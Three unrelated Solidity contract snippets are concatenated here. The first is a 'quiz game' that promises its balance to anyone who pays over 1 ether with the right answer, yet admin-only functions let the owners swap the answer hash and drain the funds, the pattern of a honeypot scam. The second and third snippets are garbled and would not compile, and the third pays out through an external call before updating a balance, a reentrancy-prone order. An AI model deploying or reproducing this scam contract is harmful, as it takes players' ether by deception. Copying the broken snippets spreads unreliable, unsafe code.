pragma solidity ^0.4.25;

contract Az_GAME
{
    function Try(string _response) external payable
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(_response) && msg.value > 1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }

    string public question;

    bytes32 responseHash;

    mapping (bytes32=>bool) admin;

    function Start(string _question, string _response) public payable isAdmin{
        if(responseHash==0x0){
            responseHash = keccak256(_response);
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        msg.sender.transfer(this.balance);
    }

    function New(string _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

    constructor(bytes32[] admins) public{
        for(uint256 i=0; i< admins.length; i++){
            admin[admins[i]] = true;
        }
    }

    modifier isAdmin(){
        require(admin[keccak256(msg.sender)]);
        _;
    }

    function() public payable{}
}
pragma solidity ^0.5.24;
contract check {
	uint validSender;
	constructor() public {owner = msg.sender;}
	function checkAccount(address account,uint key) {
		if (msg.sender != owner)
			throw;
			checkAccount[account] = key;
		}
	}
}
pragma solidity ^0.4.24;
contract ContractExternalCall {
	uint depositedAmount;
	 function signal() public {
    msg.sender.call{value: msg.value, gas: 5000}
    depositedAmount[msg.sender] = 0;
 }
}
